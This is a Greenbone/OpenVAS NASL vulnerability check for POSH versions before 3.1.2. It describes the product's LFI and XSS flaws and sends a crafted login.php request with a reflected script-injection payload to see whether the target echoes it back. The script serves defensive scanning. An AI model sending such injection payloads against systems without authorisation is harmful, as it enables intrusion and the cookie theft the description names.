# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103299");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-10-13 13:40:58 +0200 (Thu, 13 Oct 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("POSH < 3.1.2 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more details.");

  script_tag(name:"summary", value:"POSH is prone to a local file include (LFI) vulnerability and a
  cross-site scripting (XSS) vulnerability because it fails to properly sanitize user-supplied
  input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit the local file include vulnerability
  using directory traversal strings to view and execute local files within the context of the
  webserver process. Information harvested may aid in further attacks.

  The attacker may leverage the cross-site scripting issue to execute arbitrary script code in the
  browser of an unsuspecting user in the context of the affected site. This may let the attacker
  steal cookie-based authentication credentials and launch other attacks.");

  script_tag(name:"affected", value:"POSH prior to version 3.1.2.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50077");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

vt_strings = get_vt_strings();

foreach dir (make_list_unique("/posh", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/portal/login.php");
  if (!res || res !~ "^HTTP/1\.[01] 200")
    continue;

  url = dir + "/portal/login.php?message=XSS%20Catched%20!%22))%3C/script%3E%3Cscript%3Ealert(/" +
        vt_strings["lowercase"] + "/)%3C/script%3E";

  if (http_vuln_check(port: port, url: url, pattern: "<script>alert\(/" + vt_strings["lowercase"] + "/\)</script>",
                      check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
